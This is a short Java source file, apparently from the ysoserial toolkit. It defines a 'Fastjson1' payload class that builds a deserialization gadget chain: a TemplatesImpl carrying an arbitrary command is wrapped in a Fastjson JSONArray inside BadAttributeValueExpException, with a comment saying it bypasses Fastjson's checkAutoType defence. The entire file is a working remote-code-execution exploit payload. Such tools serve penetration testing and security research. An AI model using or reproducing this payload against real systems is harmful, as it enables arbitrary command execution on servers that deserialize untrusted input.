package ysoserial.payloads;

import com.alibaba.fastjson.JSONArray;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.util.ArrayList;

import static ysoserial.payloads.util.Reflections.setFieldValue;

public class Fastjson1 implements ObjectPayload<Object>{
    @Override
    public Object getObject(String command) throws Exception {
        Templates tmpl = (Templates) Gadgets.createTemplatesImpl(command);

        // bypass checkAutoType
        ArrayList<Object> arrayList = new ArrayList<>();
        arrayList.add(tmpl);

        JSONArray jsonArray = new JSONArray();
        jsonArray.add(tmpl);

        BadAttributeValueExpException val = new BadAttributeValueExpException(null);
        setFieldValue(val, "val", jsonArray);
        arrayList.add(val);
        return arrayList;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(Fastjson1.class, args);
    }
}
